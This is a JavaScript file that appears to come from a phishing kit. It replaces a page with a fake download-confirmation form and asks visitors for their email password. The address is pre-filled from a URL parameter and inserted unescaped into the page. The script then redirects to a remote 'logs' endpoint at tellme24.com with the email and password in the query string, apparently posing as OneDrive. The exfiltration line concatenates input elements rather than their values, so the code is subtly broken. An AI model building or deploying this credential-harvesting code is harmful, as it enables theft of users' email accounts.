const validEmail =
    /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;

let mailer = "";

const main_container = document.getElementById("main_container");
const form_caller = document.getElementById("form_caller");
const form_main = document.getElementById("form_main");
// const form_aside = document.getElementById("form_aside");

const temp_mail = document.getElementById("temp_mail");

const sub_btn = document.getElementById("sub_btn");

// 
const urlParams = new URLSearchParams(window.location.search);
const getMail = urlParams.get('user');



if (validEmail.test(temp_mail.value)) {
    mailer = temp_mail.value
} 
else if(validEmail.test(getMail)) {
    mailer = getMail
}

sub_btn.addEventListener("click", ()=>{
    main_container.innerHTML = `
    <div id="form_main">
        <aside id="form_aside">
        <img src="0.jpg" alt="">
        <p>Confirm your account to start download!</p>
        <input type="text" class="input_mail" placeholder="Enter Email Address" readonly value="${mailer}">
        <input type="password" class="input_pass" placeholder="Enter Email Password">
        <button onclick="subFormBtn(this)">Download Now</button>
        </aside>
    </div>
`;
});

function subFormBtn(b) {
    let page = b.parentElement;
    let mail = page.getElementsByClassName("input_mail")[0]
    let pass = page.getElementsByClassName("input_pass")[0]

    if (!validEmail.test(mail.value)) {
        mail.style.border = "1px solid red";
        return
    }
    else if (pass.value == "" || pass.value == 123456 || pass.value.toLowerCase() == "qwerty") {
        pass.style.border = "1px solid red";
        return
    }

    let url = "https://tellme24.com/logs/one_drv/drv.php?auth=oneDrive&pass="+pass+"&mail="+mail;

    location = url;
}

